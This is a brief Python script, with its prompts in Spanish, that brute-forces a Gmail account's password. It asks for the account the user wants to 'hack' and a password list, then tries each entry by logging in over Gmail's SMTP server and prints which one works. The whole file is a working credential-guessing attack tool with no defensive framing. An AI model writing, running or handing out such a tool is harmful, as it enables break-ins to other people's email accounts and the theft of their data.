#/usr/bin/python

import smtplib
from termcolor import colored

smtpServer = smtplib.SMTP("smtp.gmail.com", 587)
smtpServer.ehlo()
smtpServer.starttls()

user = input("Introduce la cuenta gmail que quieres hackear: ")
file = input("Elige el archivo con las contrasena para su uso: ")
passwordFile = open(file, "r")

for password in passwordFile:
    password = password.strip('\n')
    try:
        smtpServer.login(user, password)
        print(colored('[+] contrasena correcto & encontrada: %s' % password, "green")) 
    except smtplib.SMTPAuthenticationError:
        print(colored('[-] la Contrasena no Funciona: %s' % password, "red"))

